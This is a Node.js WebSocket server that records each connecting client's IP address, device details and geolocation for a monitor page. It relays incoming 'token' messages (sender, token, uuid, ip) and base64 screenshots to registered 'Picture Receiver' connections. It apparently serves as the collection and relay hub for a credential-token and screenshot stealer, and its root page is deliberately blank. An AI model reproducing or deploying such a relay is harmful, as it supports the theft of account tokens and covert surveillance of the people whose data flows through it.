import http from 'http';
import express from 'express';
import { WebSocket, WebSocketServer } from 'ws';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';
import geoip from 'geoip-lite';
import UAParser from 'ua-parser-js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, ws => {
        wss.emit('connection', ws, request);
    });
});

// WebSocket logic
const usersInChat = new Map();
const pictureReceivers = new Map(); 
const monitorConnections = new Set();
let keepAliveId = null;

wss.on("connection", (ws, req) => {
    const userID = crypto.randomUUID();
    const clientInfo = extractClientInfo(ws, req);
    usersInChat.set(userID, clientInfo);

    ws.on("message", (data) => {
        handleMessage(ws, data, userID);
    });

    ws.on("close", () => {
        handleDisconnect(userID, ws);
    });

    if (wss.clients.size === 1 && !keepAliveId) {
        keepServerAlive();
    }

    sendClientUpdate();
});

wss.on("close", () => {
    if (keepAliveId) {
        clearInterval(keepAliveId);
        keepAliveId = null;
    }
});

const handleMessage = (ws, data, userID) => {
    try {
        const messageData = JSON.parse(data.toString());
        
        if (messageData.type === 'monitor') {
            monitorConnections.add(ws);
            sendClientUpdate();
        } else if (messageData.command === 'Picture Receiver') {
            pictureReceivers.set(userID, ws);
        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
            broadcastToPictureReceivers(messageData);
        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else if (messageData.action === 'screenshot_result') {
            broadcastToPictureReceivers({
                type: 'screenshot',
                action: messageData.action,
                screen: messageData.screen,
                data: messageData.data
            });
        } else {
            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
        }

        // Update last active time
        const clientInfo = usersInChat.get(userID);
        if (clientInfo) {
            clientInfo.lastActiveTime = new Date().toISOString();
            usersInChat.set(userID, clientInfo);
            sendClientUpdate();
        }
    } catch (e) {
        console.error('Error parsing or processing message:', e);
        console.error('Raw message data:', data);
    }
};

const broadcastToPictureReceivers = (message) => {
    const data = JSON.stringify(message);
    pictureReceivers.forEach((ws, userId) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(data, error => {
                if (error) console.error("Error sending message to receiver:", error);
            });
        }
    });
};

const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
    wss.clients.forEach(client => {
        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
            client.send(message);
        }
    });
};

const handleDisconnect = (userID, ws) => {
    usersInChat.delete(userID);
    pictureReceivers.delete(userID);
    monitorConnections.delete(ws);
    sendClientUpdate();
};

const keepServerAlive = () => {
    keepAliveId = setInterval(() => {
        wss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
                client.ping(); 
            }
        });
    }, 30000);
};

function extractClientInfo(ws, req) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgentString = req.headers['user-agent'];
    const parser = new UAParser(userAgentString);
    const result = parser.getResult();
    const geoData = geoip.lookup(ip);

    return {
        ip: ip,
        userAgent: {
            browser: {
                name: result.browser.name || 'Unknown',
                version: result.browser.version || ''
            },
            engine: {
                name: result.engine.name || 'Unknown',
                version: result.engine.version || ''
            },
            os: {
                name: result.os.name || 'Unknown',
                version: result.os.version || ''
            },
            device: {
                model: result.device.model || 'Unknown',
                type: result.device.type || 'Unknown',
                vendor: result.device.vendor || 'Unknown'
            },
            cpu: {
                architecture: result.cpu.architecture || 'Unknown'
            }
        },
        geoLocation: geoData ? {
            country: geoData.country,
            region: geoData.region,
            city: geoData.city,
            ll: geoData.ll,
        } : null,
        connectTime: new Date().toISOString(),
        lastActiveTime: new Date().toISOString(),
    };
}

function sendClientUpdate() {
    const clientData = Array.from(usersInChat.entries()).map(([id, clientInfo]) => ({
        id,
        info: clientInfo
    }));
    const updateMessage = JSON.stringify({
        type: 'clientUpdate',
        clients: clientData
    });
    monitorConnections.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(updateMessage);
        }
    });
}

// Routes
app.get('/', (req, res) => {
    res.setHeader('Cache-Control', 'no-store');
    res.status(200).send('');
});

app.get('/monitor', (req, res) => {
    res.sendFile(path.join(__dirname, 'monitor.html'));
});

app.get('/node-version', (req, res) => {
    res.send(`Node.js version: ${process.version}`);
});

server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
